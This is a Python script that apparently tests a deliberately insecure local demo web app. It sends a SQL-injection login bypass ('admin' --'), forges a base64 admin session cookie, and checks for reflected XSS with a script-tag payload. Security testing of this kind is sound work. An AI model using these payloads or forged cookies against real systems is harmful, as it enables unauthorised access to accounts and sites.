import requests
import base64
import json
import hashlib

BASE_URL = "http://localhost:8000"
INSECURE_LOGIN = f"{BASE_URL}/login/insecure/"
STORE_INSECURE_URL = f"{BASE_URL}/store/insecure/"

def test_sqli_bypass():
    print(f"[*] Testing SQLi Bypass on {INSECURE_LOGIN}")
    # Payload: admin' -- comments out the password.
    data = {
        'username': "admin' --",
        'password': "invalidpassword"
    }
    
    try:
        r = requests.post(INSECURE_LOGIN, data=data, allow_redirects=False)
        if r.status_code == 302 and 'insecure_sess' in r.cookies:
            print("[+] VULNERABILITY CONFIRMED: SQL Injection Login Bypass successful!")
            # Check cookie data
            cookie = r.cookies['insecure_sess']
            decoded = json.loads(base64.b64decode(cookie).decode())
            print(f"    Leaked Cookie Data: {decoded}")
            return True
        else:
            print("[-] SQLi failed. Status:", r.status_code)
            return False
    except requests.exceptions.ConnectionError:
        print("[!] Connection Refused. Is the server running?")
        return False

def test_xss_reflected():
    print(f"[*] Testing Reflected XSS on {STORE_INSECURE_URL}")
    payload = "<script>alert('XSS')</script>"
    params = {'q': payload}
    
    # Needs valid cookie first? 
    # Let's get cookie from SQLi test first, or hardcode valid user cookie
    token = base64.b64encode(json.dumps({'user_id': 1, 'username': 'admin', 'role': 'admin'}).encode()).decode()
    cookies = {'insecure_sess': token}
    
    try:
        r = requests.get(STORE_INSECURE_URL, params=params, cookies=cookies)
        if payload in r.text:
            print("[+] VULNERABILITY CONFIRMED: Reflected XSS payload found in response!")
            return True
        else:
            print("[-] XSS payload not found reflected in source.")
            return False
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

if __name__ == "__main__":
    test_sqli_bypass()
    test_xss_reflected()
